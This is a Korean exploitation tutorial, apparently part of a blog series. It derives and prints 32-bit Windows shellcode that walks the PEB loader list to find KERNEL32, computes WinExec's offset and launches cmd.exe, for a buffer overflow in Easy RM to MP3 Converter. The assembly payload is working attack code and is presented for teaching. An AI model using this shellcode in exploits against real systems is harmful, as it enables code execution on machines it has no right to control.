---
title:  "Windows Stack Buffer Overflow 2 - 셸코드 작성"
search: true
categories: 
  - Windows Userland
last_modified_at: 2025-06-05
comments: true 
published: true
---

취약점을 확인했으니, 셸코드를 작성해보자.

### Shellcode - 32bit
- Linux와 달리 Windows는 사용자가 직접 시스템 콜을 호출하는 것이 어려우므로, KERNEL32.dll의 `WinExec` 함수를 이용하여 cmd를 실행하는 셸코드를 작성하는 것을 목표로 한다.
- `WinExec` 함수를 호출하려면, KERNEL32.dll 라이브러리가 적재된 주소를 알아내야 한다. 이는 프로세스의 PEB(Process Environment Block)를 이용하여 알아낼 수 있다.
  - ASLR이 적용되지 않더라도, 컴퓨터가 재부팅되는 경우 라이브러리 적재 주소가 변할 수 있다.
- WinDbg에서 프로세스의 PEB를 확인하려면 `!peb`를 입력한다.
```
0:000> !peb
PEB at 0020e000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            Yes
    ImageBaseAddress:         00400000
    NtGlobalFlag:             70
    NtGlobalFlag2:            0
    Ldr                       77b74360
    Ldr.Initialized:          Yes
    Ldr.InInitializationOrderModuleList: 006844f0 . 0807aab0
    Ldr.InLoadOrderModuleList:           006845f8 . 0807aaa0
    Ldr.InMemoryOrderModuleList:         00684600 . 0807aaa8
            Base TimeStamp                     Module
          400000 451c80f6 Sep 29 11:12:06 2006 C:\Program Files (x86)\Easy RM to MP3 Converter\RM2MP3Converter.exe
        77a40000 392faaea May 27 20:00:58 2000 C:\WINDOWS\SYSTEM32\ntdll.dll
        75660000 33b92743 Jul 02 00:50:27 1997 C:\WINDOWS\System32\KERNEL32.DLL
        76b40000 3ff9f933 Jan 06 08:54:27 2004 C:\WINDOWS\System32\KERNELBASE.dll
				...
    SubSystemData:     00000000
    ProcessHeap:       00680000
    ProcessParameters: 00682d18
    CurrentDirectory:  'C:\Program Files (x86)\Easy RM to MP3 Converter\'
    WindowTitle:  'C:\Program Files (x86)\Easy RM to MP3 Converter\RM2MP3Converter.exe'
    ImageFile:    'C:\Program Files (x86)\Easy RM to MP3 Converter\RM2MP3Converter.exe'
    CommandLine:  '"C:\Program Files (x86)\Easy RM to MP3 Converter\RM2MP3Converter.exe"'
    DllPath:      '< Name not readable >'
    Environment:  00681c60
        =::=::\
        ALLUSERSPROFILE=C:\ProgramData
        ...
```
- PEB 주소를 알아내려면 FS 레지스터를 이용할 수 있으며, PEB 구조체는 다음과 같이 구성된다.
```
0:000> dt ntdll!_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 BitField         : UChar
   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
   +0x003 IsProtectedProcess : Pos 1, 1 Bit
   +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit
   +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit
   +0x003 IsPackagedProcess : Pos 4, 1 Bit
   +0x003 IsAppContainer   : Pos 5, 1 Bit
   +0x003 IsProtectedProcessLight : Pos 6, 1 Bit
   +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit
   +0x004 Mutant           : Ptr32 Void
   +0x008 ImageBaseAddress : Ptr32 Void
   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA
   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS
		...
```
  - 프로세스에 로드된 모듈 리스트는 `Ldr` 필드에 위치한다.
- `Ldr` 필드는 `_PEB_LDR_DATA` 구조체이며, 이는 다음과 같이 구성된다.
```
0:000> dt ntdll!_PEB_LDR_DATA
   +0x000 Length           : Uint4B
   +0x004 Initialized      : UChar
   +0x008 SsHandle         : Ptr32 Void
   +0x00c InLoadOrderModuleList : _LIST_ENTRY
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY
   +0x024 EntryInProgress  : Ptr32 Void
   +0x028 ShutdownInProgress : UChar
   +0x02c ShutdownThreadId : Ptr32 Void
```
  - 모듈 목록 `InMemoryOrderModuleList`는 연결리스트(`_LIST_ENTRY`)로 이루어져 있다.
  - 모듈 연결리스트의 각 항목은 `_LDR_DATA_TABLE_ENTRY` 구조체로 이루어져 있으며, 다음과 같이 구성된다.
  ```
  0:000> dt _LDR_DATA_TABLE_ENTRY
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY
   +0x008 InMemoryOrderLinks : _LIST_ENTRY
   +0x010 InInitializationOrderLinks : _LIST_ENTRY
   +0x018 DllBase          : Ptr32 Void
   +0x01c EntryPoint       : Ptr32 Void
   +0x020 SizeOfImage      : Uint4B
   +0x024 FullDllName      : _UNICODE_STRING
   +0x02c BaseDllName      : _UNICODE_STRING
   +0x034 FlagGroup        : [4] UChar
   +0x034 Flags            : Uint4B
   +0x034 PackagedBinary   : Pos 0, 1 Bit
   +0x034 MarkedForRemoval : Pos 1, 1 Bit
   +0x034 ImageDll         : Pos 2, 1 Bit
   +0x034 LoadNotificationsSent : Pos 3, 1 Bit
	 ...
  ```
  - 이때 `_LDR_DATA_TABLE_ENTRY` 구조체의 `InMemoryOrderLinks` 필드는 `_LDR_DATA_TABLE_ENTRY` 구조체의 시작점이 아닌 `InMemoryOrderLinks`(+0x08) 위치를 기준으로 연결리스트가 구성되어 있으므로, 주소를 구했다면 8을 빼야 원래의 `_LDR_DATA_TABLE_ENTRY` 구조체의 주소를 구할 수 있다.
  - 연결리스트를 순회하면서 특정 이미지의 베이스 주소를 구하고 싶다면, 해당 주소로부터 `0x18`을 더하는 것이 아닌 `0x10`을 더해야 한다.

- KERNEL32.dll의 베이스 주소를 계산했다면, 함수 오프셋을 이용하여 `WinExec` 함수의 주소를 계산한다.
```
0:000> lm m kernel32
Browse full module list
start    end        module name
75660000 75750000   KERNEL32   (pdb symbols)          C:\ProgramData\Dbg\sym\wkernel32.pdb\D0D323A6EF59DAAF68A4DA715D0BE5301\wkernel32.pdb
0:000> x kernel32!WinExec
756c3d20          KERNEL32!WinExec (_WinExec@8)
0:000> ? 756c3d20 - 75660000
Evaluate expression: 408864 = 00063d20
```

- `WinExec` 함수의 원형은 다음과 같다.
```c
UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
);
```
  - `lpCmdLine`: 실행 프로그램 명령줄
  - `uCmdShow`: 표시 옵션. 일반적으로 `SW_NORMAL(1)`로 설정.
  - 따라서, 다음과 같이 호출하자. `WinExec("C:\Windows\System32\cmd.exe", 1);`

### 제작 결과
- 널바이트를 고려하여 작성된 전체 어셈블리 코드는 다음과 같다.

```
sub sp, 0x108

xor ecx, ecx
mov cl, 0x30           
mov esi, fs:[ecx]        ; fs 레지스터를 이용하여 _PEB 주소 가져오기


mov esi, [esi+0xc]       ; _PEB->_PEB_LDR_DATA
mov esi, [esi+0x14]      ; _PEB_LDR_DATA->_LDR_DATA_TABLE_ENTRY = Program

mov esi, [esi]           ; NTDLL
mov esi, [esi]           ; KERNEL32

mov esi, [esi+0x10]      ; KERNEL32->DllBase
add esi, 0x123A9C68      ; DllBase + 0x63d20 + 0x12345678- 0x12345678 = KERNEL32!WinExec
sub esi, 0x12345678      

xor ebx, ebx
push ebx
push 0x6578652e          ; "C:\Windows\System32\cmd.exe"
push 0x646d635c
push 0x32336d65
push 0x74737953
push 0x5c73776f
push 0x646e6957
push 0x5c3a43FF

mov ebx, esp
add bl, 1
push 1
push ebx

call esi                 ; WinExec("C:\Windows\System32\cmd.exe", 1)
```